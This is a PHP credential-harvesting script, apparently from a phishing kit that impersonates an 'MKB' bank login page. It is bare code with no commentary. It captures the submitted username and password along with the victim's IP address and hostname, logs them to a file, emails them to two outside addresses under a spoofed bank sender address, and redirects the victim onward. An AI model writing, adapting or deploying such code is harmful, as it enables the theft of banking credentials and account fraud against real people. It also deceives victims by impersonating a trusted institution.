 <?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Username : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$msg .= "--------------MKB Login------------\n\n";
$post = "abs0000100@gmail.com,abs00001000@hotmail.com";
$fp = fopen("../use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - ".$_POST['kod']."\n";
$from = "From: MKBLogin<info@mkb.hu>";
mail("$post",$subj, $msg, $from);
header("Location:   load.htm");  

?>
 
 